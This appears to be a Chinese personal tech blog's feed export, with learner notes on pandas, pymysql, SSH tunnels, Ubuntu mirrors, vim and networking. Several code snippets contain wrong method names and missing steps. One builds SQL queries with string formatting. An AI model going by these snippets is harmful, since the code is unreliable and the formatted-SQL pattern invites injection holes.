class="code"><pre><span class="line"># pandas读取csv文件</span><br><span class="line">data2 = pd.read_csv(&quot;path&quot;,sep = &#x27;,&#x27;,header = None,encoding = &#x27;utf-8&#x27;,names = [&#x27;col1&#x27;,&#x27;col2&#x27;]</span><br><span class="line"># 使用jupyter可以使用?+方法的方式查看方法下定义了哪些参数</span><br><span class="line"># 例如?pd.read_csv </span><br><span class="line"># 读取excel文件的操作类似，用的是.read_excel方法</span><br></pre></td></tr></table></figure><h4 id="数据写出"><a href="#数据写出" class="headerlink" title="数据写出"></a>数据写出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data2.to_csx(&quot;path&quot;,sep=&#x27;,&#x27;,header=None,encoding=&#x27;utf-8&#x27;,index=false)# index默认为true，index是索引，true时会输出索引列</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><h3 id="读写mysql库"><a href="#读写mysql库" class="headerlink" title="读写mysql库"></a>读写mysql库</h3><ol><li>创建一个连接对象</li></ol><p>host mysql 服务器地址</p><p>port 数字类型 端口</p><p>user 用户名</p><p>passwd 密码</p><p>db 数据库名称</p><p>charset 连接编码，需要显示指明编码方式</p><ol start="2"><li>获取游标</li></ol><p>游标是什么？</p><p>游标(cursor)是一个游动的标识，可以理解成一条sql取出对应n条结果资源的接口&#x2F;句柄，就是游标，沿着游标可以一次取出一行</p><p>execute() 执行一个数据库查询和命令<br>fetchone() 取得结果集下一行<br>fetchmany(size) 取得结果集size行<br>fetchall() 取得结果集所有行<br>close() 关闭cursor</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import pymysql # pymysql用于python3以上连接mysql的一个库</span><br><span class="line">import pandas as pd</span><br><span class="line">conn =  mysql.connect(host=&#x27;localhost&#x27;,port=3306,user=&#x27;root&#x27;,passwd=&#x27;xxxx&#x27;,db=&#x27;mysql&#x27;,charset=&#x27;utf-8&#x27;) # 创建一个连接对象，打开数据库连接</span><br><span class="line">cursor = conn.cursor() # 获取游标</span><br><span class="line">sql = &quot;&quot;&quot; SELECT *</span><br><span class="line">from mysql.test1&quot;&quot;&quot; # 创建一个字符串语句，字符串支持换行</span><br><span class="line">cursor.execute(sql)</span><br><span class="line">data1 = cursor.fetchall()</span><br><span class="line"># data1 = cursor.fetchmany(2)</span><br><span class="line"># data2 = cursor.fetchone()</span><br><span class="line">df1 = pd.DataFrame(list(data1),columns=[&quot;id&quot;,&quot;col1&quot;,&quot;col2&quot;])</span><br></pre></td></tr></table></figure><h4 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pymysql # pymysql用于python3以上连接mysql的一个库</span><br><span class="line">import pandas as pd</span><br><span class="line">conn =  mysql.connect(host=&#x27;localhost&#x27;,port=3306,user=&#x27;root&#x27;,passwd=&#x27;xxxx&#x27;,db=&#x27;mysql&#x27;,charset=&#x27;utf-8&#x27;) # 创建一个连接对象，打开数据库连接</span><br><span class="line">cursor = conn.cursor() # 获取游标</span><br><span class="line">num0 = 6</span><br><span class="line">num1 = 8</span><br><span class="line">sql = &quot;&quot;&quot;SELECT *</span><br><span class="line">from mysql.test1</span><br><span class="line">where col2 &gt;= &#123;0&#125;</span><br><span class="line">and col2 &lt;= &#123;1&#125;&quot;&quot;&quot;.format(num0,num1) # 格式化输出，将num0和num1 的值传入字符串的大括号中。由此实现传参操作</span><br><span class="line">data1 = cursor.fetchall()</span><br><span class="line"># data1 = cursor.fetchmany(2)</span><br><span class="line"># data2 = cursor.fetchone()</span><br><span class="line">df1 = pd.DataFrame(list(data1),columns=[&quot;id&quot;,&quot;col1&quot;,&quot;col2&quot;])</span><br></pre></td></tr></table></figure><h4 id="通过跳板机SSH访问数据库"><a href="#通过跳板机SSH访问数据库" class="headerlink" title="通过跳板机SSH访问数据库"></a>通过跳板机SSH访问数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pymysql</span><br><span class="line">import pandas as pd</span><br><span class="line">from sshtunnel import SSHTunnelForwarder</span><br><span class="line">with SSHTunnelForwarder(</span><br><span class="line">#配置SSH连接</span><br><span class="line">ssh_address_or_host = (&quot;跳板机对应的ip&quot;, int(&#x27;跳转机端口号&quot;)), # 指定ssh登录的跳转机的address</span><br><span class="line">ssh_password = &quot;跳转机的密码”</span><br><span class="line">ssh_username = &quot;跳转机的用户“</span><br><span class="line">local_bind_address = (&quot;127.0.0.1&quot;, int(&quot;2222&quot;)), # 映射到本机的地址和端口，此处必须是127.0.0.1</span><br><span class="line">remote_bind_address = (&quot;mysql服务器地址&quot;, int(&quot;端口号&quot;))) as server: # mysql服务器的配置，有数据的服务器</span><br><span class="line">conn = pymysql.connect(host = &quot;127.0.0.1&quot;, port = 2222, user = &quot;mysql服务器用户名&quot;, password = &quot;mysql服务器的密码&quot;)</span><br><span class="line">cursor = conn.cursor()# 获取游标</span><br></pre></td></tr></table></figure><ul><li>今天看见芋圆感觉很憔悴，想帮帮她但是她不会接受，反而给她添麻烦了。相处中一厢情愿的事情还是尽量避免吧。也许她说的工作上的事只是需要倾听者，而不是需要你的帮助，你若提出帮助或者表达自己不能帮上忙的愧疚，她会觉得你是不是不希望听她抱怨工作上的事。不光是她也许很多人都是这样的，多注意她人的感受吧。</li></ul><h1 id="pandas数据处理技巧"><a href="#pandas数据处理技巧" class="headerlink" title="pandas数据处理技巧"></a>pandas数据处理技巧</h1><h2 id="DataFrame生成"><a href="#DataFrame生成" class="headerlink" title="DataFrame生成"></a>DataFrame生成</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd.DataFrame([[&#x27;a1&#x27;,11],[&#x27;a2&#x27;,12]],columns=[&#x27;col1&#x27;,&#x27;col2&#x27;])  #列表元组都能生成DataFrame </span><br></pre></td></tr></table></figure><h2 id="查看数据框（DataFrame-数据类型"><a href="#查看数据框（DataFrame-数据类型" class="headerlink" title="查看数据框（DataFrame)数据类型"></a>查看数据框（DataFrame)数据类型</h2><ul><li>.dtypes 方法可以查看数据框每列的数据类型</li><li>.（列名）.dtypes 方法可以查看特定列的数据类型</li></ul><h2 id="数据框列属性变换"><a href="#数据框列属性变换" class="headerlink" title="数据框列属性变换"></a>数据框列属性变换</h2><ul><li>df1.col2 &#x3D; df1.col2.astype(int)</li></ul><h2 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list(df1.index)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="查看列名"><a href="#查看列名" class="headerlink" title="查看列名"></a>查看列名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(df1.columns)</span><br></pre></td></tr></table></figure><h2 id="列重命名"><a href="#列重命名" class="headerlink" title="列重命名"></a>列重命名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df1 = df1.rename(columns=&#123;&quot;原名字&quot;:&quot;新名字&quot;&#125;)</span><br></pre></td></tr></table></figure><h2 id="数据选取"><a href="#数据选取" class="headerlink" title="数据选取"></a>数据选取</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 选取数据前n行</span><br><span class="line">df1.header(n) #默认选取前五行</span><br><span class="line"># 通过行索引</span><br><span class="line">df1[1:6] # 取1到5行的数据</span><br><span class="line">#通过列名选取数据</span><br><span class="line">df1[[&quot;id&quot;,&quot;col1&quot;]]</span><br></pre></td></tr></table></figure><h3 id="通过加条件选取数据"><a href="#通过加条件选取数据" class="headerlink" title="通过加条件选取数据"></a>通过加条件选取数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 选取带缺失值的数据记录</span><br><span class="line">df1[df1.isnull(),values==True]</span><br><span class="line">df1.isnull() # 选取出来的是一个数组列表，里面都是True or False</span><br><span class="line">df1[df1.nonull(),values==True]</span><br><span class="line"># 缺失值填充</span><br><span class="line">df1.fillna(0)</span><br><span class="line"># 缺失值删除</span><br><span class="line">df1=df1.dropna()</span><br><span class="line"># 逻辑条件筛选</span><br><span class="line">df1[~(df1.col2&lt;=2)&amp;(df1.col2&lt;=10)] # ~是取非</span><br><span class="line"># 类似sql语句</span><br><span class="line">df1.query(&quot;col2&gt;=6 and col2&lt;=10&quot;) </span><br></pre></td></tr></table></figure><h3 id="数据塑性（数据透视表）"><a href="#数据塑性（数据透视表）" class="headerlink" title="数据塑性（数据透视表）"></a>数据塑性（数据透视表）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">df2</span><br><span class="line">pd.pivot_table(df2.index=&quot;name&quot;,columns=&quot;date&quot;,values = &quot;money&quot;, aggfunc = &quot;sum&quot;, fill_value = 0)</span><br><span class="line">df2_new.reset_index()</span><br><span class="line">df2_new2 = pd.pivot_table(df2, index = &quot;name&quot;, columns = &quot;date&quot;, values = &quot;money&quot;, aggfunc = &quot;sum&quot;, fill_value = 0).reset_index()</span><br><span class="line">df2_new2</span><br></pre></td></tr></table></figure><h3 id="数据拼接"><a href="#数据拼接" class="headerlink" title="数据拼接"></a>数据拼接</h3><ul><li><p>concat 是一种基本的合并方式。常用参数：axis 指明合并方向， axis &#x3D; 0 是默认值，0 表示上下合并，1 表示左右合并</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">concat_data1 = pd.DataFrame(&#123;&quot;col1&quot;:list(range(0,10)),&quot;col2&quot;:list(range(0,10))&#125;)</span><br><span class="line"></span><br><span class="line">concat_data2 = pd.DataFrame(&#123;&quot;col1&quot;:list(range(11,17)),&quot;col2&quot;:list(range(11,17))&#125;)</span><br><span class="line"></span><br><span class="line">pd.concat([concat_data1,concat_data2],axis = 0) # 上下拼接时列名尽可能保持一致</span><br><span class="line"></span><br><span class="line"># append 函数上下拼接</span><br><span class="line">concat_data1.append(concat_data2).reset_index() # 将concat_data2加到concat_data1后</span><br></pre></td></tr></table></figure></li><li><p>merge 函数  </p><p>  常用参数：</p><ul><li>how: 连接方式 “inner” 内连接 “left”左连接 “right” 右连接　　</li><li>on 用于连接的key,即列名，要连接的数据必须要都有该列名 left_on 左侧数据用作连接的键，right_on 右侧数据用作连接的键。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pd.merge(df2, df1, on = &quot;id&quot;, how = &quot;inner&quot;) # 内连接会将两个表共有的数据连接，不共有删除。</span><br><span class="line"></span><br><span class="line">pd.merge(df2, df1, on = &quot;id&quot;, how = &quot;left&quot;) # how中的以左连接数据为主即df2中有的连接，没得删除，如果df2中有，df1中没有则添加空值NaN</span><br><span class="line"></span><br><span class="line">pd.merge(df2, df1, on = &quot;id&quot;, how = &quot;right&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分组统计"><a href="#分组统计" class="headerlink" title="分组统计"></a>分组统计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df2.groupby([分组变量])[统计变量].统计方法</span><br><span class="line">df2.groupby([&quot;name&quot;])[&quot;money&quot;].sum()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python,datastructure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu_arm64_mirrors_change</title>
      <link href="/2020/11/20/ubuntu-arm64-mirrors-change/"/>
      <url>/2020/11/20/ubuntu-arm64-mirrors-change/</url>
      
        <content type="html"><![CDATA[<h1 id="在树莓派上安装Ubuntu系统"><a href="#在树莓派上安装Ubuntu系统" class="headerlink" title="在树莓派上安装Ubuntu系统"></a>在树莓派上安装Ubuntu系统</h1><p>1.找到适合的系统，我用的是树莓派4B8G内存版本，所以使用的树莓派系统是arm64<br>2.建议直接在镜像源网站上找到对应的系统下载，官网下载太慢了<br>3.SD卡用老板给的格式化软件格式化，再用老板给的烧录软件烧录镜像文件进SD卡<br>4.发现可以开机了<br>5.装好之后要改变系统源和软件源</p><h1 id="系统源和软件源设置"><a href="#系统源和软件源设置" class="headerlink" title="系统源和软件源设置"></a>系统源和软件源设置</h1><p>首先找到一个镜像网站一般是mirrors.XXXX.xxx<br>其次命令行进入&#x2F;etc&#x2F;apt&#x2F;找到sources.list文件。建议用sudo su 进入管理员模式编辑，vi 打开文件参照底下原有配置更改，一般是deb <a href="https://mirrors.xxx.xxx/ubuntu-ports/">https://mirrors.XXX.xxx/ubuntu-ports/</a> groovy（我的是这个不同的系统不同，需要参照原文件底下内容进行更改。arm64 系统的源在ubuntu-ports文件目录下。如果用ubuntu目录会报错未发现arm64。按照网上的方案复制进来即可，对应进行修改。<br>最后修改完成sudo apt-get update 和 sudo apt-get upgrade 升级系统更新软件源系统源。</p><h1 id="豆制品、茄子、莴笋、鱼、蛋类感觉都是我爱吃的，在吃上差别有些大。"><a href="#豆制品、茄子、莴笋、鱼、蛋类感觉都是我爱吃的，在吃上差别有些大。" class="headerlink" title="豆制品、茄子、莴笋、鱼、蛋类感觉都是我爱吃的，在吃上差别有些大。(&gt;&#x2F;\&lt;)!!以后点菜要注意了。"></a>豆制品、茄子、莴笋、鱼、蛋类感觉都是我爱吃的，在吃上差别有些大。(&gt;&#x2F;\&lt;)!!以后点菜要注意了。</h1>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu,mirror,arm64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonbasic1</title>
      <link href="/2020/11/15/pythonbasic1/"/>
      <url>/2020/11/15/pythonbasic1/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>列表，元组，字典，集合</p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>list1 &#x3D; []  空列表<br>列表是有序集合可以通过索引访问，<br>无序集合需要遍历才能知道其中的东西</p><p>type(list1)查看类型</p><p>列表长度</p><p>len(list1)</p><p>print(list1)</p><p>合并列表</p><p>list1&#x3D; list1 + list2</p><p>list1.extend(list2) 将list2的函数添加到list1，扩展原有列表</p><p>list1.append(“adsfa”) 将列表添加新的元素</p><p>list1.insert(2,[2,3])在列表中索引为2的元素前加上一个新元素</p><p>列表索引</p><p>list[2] 列表中的第三个元素</p><p>list.index[obj] 列表中找到这个元素的索引，找到第一个索引位置</p><ul><li>列表切片</li></ul><p>list1[num1:num2:num3] 通过索引选取num1到num2的元素，num3是步长表示步长1表示连续取数，步长默认也是1，步长2表示第一项第三项第五项这样隔一取一。想象一下你在踩着格子走，1步一格和一步两格踩到的格子就明白什么是步长了。</p><p>倒着取数list1[-1],这个估计在栈或者队列中会用到</p><ul><li>修改列表</li></ul><p>list1[2] &#x3D; “python” 修改列表元素<br>list1[2:4] &#x3D; [“python”,”a”]修改第三第四元素</p><p>-列表统计</p><p>list1.conut(obj)  列表中某个元素统计<br>循环统计每个元素出现次数，要转换为set 结构例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in set(list1):</span><br><span class="line">print(i,list1.count(i))</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>删除列表元素</li></ul><p>list1.pop()  默认是最后一个元素移除</p><p>list1.pop(index) 索引移除</p><p>list1.remove(object) 移除某元素第一个匹配项</p><p>list1.reverse()   反转列表</p><p>del list1 删除列表一<br>del list1[index] 删除列表中的索引数</p><ul><li>列表排序</li></ul><p>list1.sort(reverse &#x3D; True)倒序排序</p><p>list1.sort(reverse &#x3D; False)正序排序</p><ul><li>查找最大最小值</li></ul><p>max(list1)<br>min(list)</p><ul><li>常用操作</li></ul><pre><code>#生成一个1到10的列表for i in range(1,11):    list1.append(i)print(list1)# 简化写法list1 = [i for i in range(1,11)]</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>excel_auto</title>
      <link href="/2020/11/14/excel-auto/"/>
      <url>/2020/11/14/excel-auto/</url>
      
        <content type="html"><![CDATA[<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><h2 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h2><p>爬虫</p><ul><li>requests&#x2F;selenium</li></ul><h2 id="处理数据"><a href="#处理数据" class="headerlink" title="处理数据"></a>处理数据</h2><ul><li>pandas</li></ul><h2 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h2><ul><li>excel</li><li>csv</li><li>mysql</li></ul><h2 id="显示数据"><a href="#显示数据" class="headerlink" title="显示数据"></a>显示数据</h2><ul><li>matplotlib</li><li>django</li><li>html</li></ul><h1 id="pandas的特点？"><a href="#pandas的特点？" class="headerlink" title="pandas的特点？"></a>pandas的特点？</h1><p>列表&#x2F;numpy&#x2F;pandas</p><p>list<br>numpy.array<br>pandas.DataFrame</p><p>list 内存中不连续<br>numpy和pandas内存中连续，计算后在内存中保存仍连续</p><p>numpy用的是数字索引，pandas有标签索引</p>]]></content>
      
      
      
        <tags>
            
            <tag> excel,pandas,python,automation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo_test</title>
      <link href="/2020/11/12/hexo-test/"/>
      <url>/2020/11/12/hexo-test/</url>
      
        <content type="html"><![CDATA[<h1 id="重新使用hexo写技术blog"><a href="#重新使用hexo写技术blog" class="headerlink" title="重新使用hexo写技术blog"></a>重新使用hexo写技术blog</h1><p>已经有一年没有用hexo，linux，vim，很多原来很熟悉的操作现在已经忘记了。未来不知道什么时候可能也会放弃这个工具。但是现在又想用回来记录一些东西，所谓熟能生巧，第二遍使用会比第一遍学习来得更快，当然这是没有更新的前提下。</p><hr><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>首先还是hexo</p><hr><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><ul><li>hexo new 文件名，之后文件名也是你的文章名。</li><li>hexo在～目录下的blog文件夹内，文章在~&#x2F;blog&#x2F;source&#x2F;_posts中。</li><li>hexo g 生成静态文件不过没试过</li><li>hexo d 是部署</li><li>注意部署前一定要联网，linux的老电脑无线网卡要sudo pm-suspend,才能联网。这大概就是我想换电脑的原因吧，但是想想也是因为电脑老的不行了才想换linux毕竟linux对电脑性能要求不高。</li><li>hexo clean 也是常用操作，虽然还是没搞懂这个有啥用</li><li>顺带一提，因为hexo很久没用了，所以还是提示一下github的账号密码，账号首字母加猎鹰，密码：数字字母特殊符号，毕竟这样的密码也就两三个试一下就出来了</li></ul><hr><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>linux感觉忘记了的基本操作不是很多，联网之前hexo已经提到了。之后就是一些基本操作，因为基本操作之后学习的过程用的很多所以不是很重要，加上之前blog写了很多没必要再写了。密码强调以下6位的，应该也很好猜了，当然不是银行卡之类的密码暴露了也没啥所以才敢写blog里</p><hr><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>这个真的是太久没用了很多以前很清楚的快捷键现在都记不住了。<br>稍稍回忆一下吧</p><ul><li>：这个模式进入退出，之前差不多忘记了，还好记得wq是保存退出没有完全忘完。</li><li>o 是从下一行开始插入</li><li>O 是从上一行开始插入</li><li>a 是从当前光标下一个字符开始插入</li><li>A 是从当前行末尾插入</li><li>i 是从光标前插入</li><li>w 单词跳跃，冒号模式是保存</li><li>e 插入模式下是跳至标点前和回车前</li><li>gg 是回到开头</li><li>G 是回到文章的末尾</li></ul><p>写了这么多但是我明白很多只有用的时候才会去查，有的有可能以后觉得麻烦都不会用了。但是学习嘛总要记点东西。</p><p>就到这里10月17日识芋圆，留个尾巴吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo,blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>network4</title>
      <link href="/2019/11/17/network4/"/>
      <url>/2019/11/17/network4/</url>
      
        <content type="html"><![CDATA[<h1 id="缩写及一些单词简介"><a href="#缩写及一些单词简介" class="headerlink" title="缩写及一些单词简介"></a>缩写及一些单词简介</h1><ul><li>WAN(Wide Area Network)</li><li>LAN(Local Area Network)</li><li>TSS(Time Sharing System)分时系统</li><li>www (World Wide Web)</li><li>IPX(Internet Work Packet Exchange)因特网包交换</li><li>SPX(Sequenced Packet Exchange)序列包交换</li><li>ISO(International Organization for Standard)国际标准化组织</li><li>OSI(Open System Interconnection)开放系统互连</li><li>IETF(Internet Engineering Task force)因特网工程部</li><li>protocol 协议</li><li>MAC(Media Access Control)介质访问控制</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxbasic7</title>
      <link href="/2019/11/17/linuxbasic7/"/>
      <url>/2019/11/17/linuxbasic7/</url>
      
        <content type="html"><![CDATA[<h1 id="jobs命令"><a href="#jobs命令" class="headerlink" title="jobs命令"></a>jobs命令</h1><ul><li>可以查看ctrl + z 暂停的命令</li><li>可以在将运行中的程序同过ctrl + c 退出</li><li>可以通过fg or bg 将暂停的程序唤醒，需输入对应暂停程序的序列号</li><li>注意在i3中暂停的程序在任何窗口都不能使用，因为i3可能将所有窗口默认为一个桌面</li></ul><h1 id="程序运行"><a href="#程序运行" class="headerlink" title="程序运行"></a>程序运行</h1><ul><li>程序名 &amp; 可以将程序放置在后台运行</li><li>例如 firefox &amp; 会打开火狐浏览器并创建进程号，且此时可以将命令行的窗口关闭不影响浏览器的正常运行</li><li>当一个i3的窗口暂停了firefox 后通过bg 再唤起，此时在别的窗口可以直接打开firefox，也会出现一个 firefox &amp;，bg 表明程序在后台运行</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i3wm</title>
      <link href="/2019/11/17/i3wm/"/>
      <url>/2019/11/17/i3wm/</url>
      
        <content type="html"><![CDATA[<h1 id="i3的基本使用"><a href="#i3的基本使用" class="headerlink" title="i3的基本使用"></a>i3的基本使用</h1><ul><li>i3的配置文件在~&#x2F;.config&#x2F;i3&#x2F;config 中记不得使用方式可以直接查询</li><li>mod键默认设置为super键</li><li>mod + Enter 打开命令行</li><li>mod + Shift + q 退出窗口</li><li>mod + 数字 切换&#x2F;不存在时生成 不同窗口</li><li>mod + Shift + 数字 切换程序到不同的窗口</li><li>mod + r 调整窗口的大小</li><li>mod + hjkl 调整需使用窗口，也可以通过方向键调整</li><li>mod + d 小命令行，不显示运行结果但是可以执行命令，还可以提示当前系统有什么命令可以执行</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> i3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/2019/11/17/python/"/>
      <url>/2019/11/17/python/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>network3</title>
      <link href="/2019/09/15/network3/"/>
      <url>/2019/09/15/network3/</url>
      
        <content type="html"><![CDATA[<h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="信道类型"><a href="#信道类型" class="headerlink" title="信道类型"></a>信道类型</h3><ul><li>点到点信道</li><li>广播信道</li></ul><h3 id="链路和数据链路"><a href="#链路和数据链路" class="headerlink" title="链路和数据链路"></a>链路和数据链路</h3><h4 id="链路"><a href="#链路" class="headerlink" title="链路"></a>链路</h4><ul><li>点到点的物理路线段，中间没有任何点</li><li>一条链路是一条通路的组成部分</li></ul><h4 id="数据链路"><a href="#数据链路" class="headerlink" title="数据链路"></a>数据链路</h4><ul><li>除了物理路线外，还必须有通信协议来控制这些数据的传输。若把实现这些协议的硬件软件加到链路上，就构成了数据链路。</li><li>最常用的方法就是用适配器（网卡），来协调软硬件</li><li>一般适配器都包含数据链路层和物理层</li></ul><h3 id="传输内容"><a href="#传输内容" class="headerlink" title="传输内容"></a>传输内容</h3><ul><li>帧</li><li>将网络层的数据装入帧，分为帧的开始和帧的结束。</li></ul><h2 id="三个基本问题"><a href="#三个基本问题" class="headerlink" title="三个基本问题"></a>三个基本问题</h2><h3 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h3><ul><li>IP数据报分成帧的数据部分最大不能超过MTU（一般1500字节）</li><li>然后两头加上帧首部（SOH）和帧尾部(EOT)</li><li>帧首部开始发送，到帧尾部结束，整个构成数据链路层的帧长</li><li>必须头尾都收到否则不算完整帧丢弃</li></ul><h3 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h3><ul><li>如传输ASCII码中不会出问题</li><li>如传输数据不光可打印字符，可能出现帧首部和帧尾部的二进制表示，导致真正的帧首部或尾部被丢弃，造成数据帧传输错误。</li><li>所以如果出现上面的情况一般会在数据中的相同表示前加上转义字符通常是ESC，进行完字符填充一般不会出错。</li><li>如有ESC则需再加个ESC进行转义。</li><li>以上整个过程对于实际使用者是透明的，自动进行。</li></ul><h3 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h3><ul><li>误码率(BER)：在一段时间内，传输错误的比特占所传输总比特的比率</li><li>误码率与信噪比有关</li></ul><h4 id="循环冗余检验-CRC"><a href="#循环冗余检验-CRC" class="headerlink" title="循环冗余检验(CRC)"></a>循环冗余检验(CRC)</h4><ul><li>用于差错控制</li><li>用到二进制的除法</li><li>除数位数n，余数位数为n-1。所以要在被除数后补n-1位</li><li>除数越大这个方法越可靠</li></ul><h4 id="帧检验序列（FCS）"><a href="#帧检验序列（FCS）" class="headerlink" title="帧检验序列（FCS）"></a>帧检验序列（FCS）</h4><ul><li>定义：在数据后面添加上的冗余码</li><li>CRC算出来的内容</li></ul><h2 id="两种情况下使用数据链路层"><a href="#两种情况下使用数据链路层" class="headerlink" title="两种情况下使用数据链路层"></a>两种情况下使用数据链路层</h2><h3 id="使用点对点"><a href="#使用点对点" class="headerlink" title="使用点对点"></a>使用点对点</h3><h4 id="PPP协议"><a href="#PPP协议" class="headerlink" title="PPP协议"></a>PPP协议</h4><ul><li>简单，封装成帧</li><li>透明性</li><li>多层网络协议</li><li>多种类型链路</li><li>差错检测</li><li>检测连接状态</li><li>最大传送单元</li><li>网络层地址协商</li><li>数据压缩协商</li></ul><h5 id="PPP协议帧格式"><a href="#PPP协议帧格式" class="headerlink" title="PPP协议帧格式"></a>PPP协议帧格式</h5><p>F　　A　　 C 　协议　　　  信息部分　　　　　FCS　　　Ｆ </p><p>7E　FF　　03　　　　　　　　　　　　　  　　　　　　　7E</p><p>1　　１　　１　　２　不超过１５００字节　　　２　　　　１　　　　　　　　　</p><ul><li>FAC协议为首部</li><li>FCSF为尾部</li><li>协议用来表示信息部分的内容</li><li>信息部分出现7E进行拆分保证透明性<ul><li>7E变7D和5E的方式进行字节填充</li><li>零比特填充方法次；‘’；；中间插入一个0</li></ul></li></ul><h3 id="使用广播信道"><a href="#使用广播信道" class="headerlink" title="使用广播信道"></a>使用广播信道</h3><h2 id="以太局域网"><a href="#以太局域网" class="headerlink" title="以太局域网"></a>以太局域网</h2><h2 id="扩展以太网"><a href="#扩展以太网" class="headerlink" title="扩展以太网"></a>扩展以太网</h2><h2 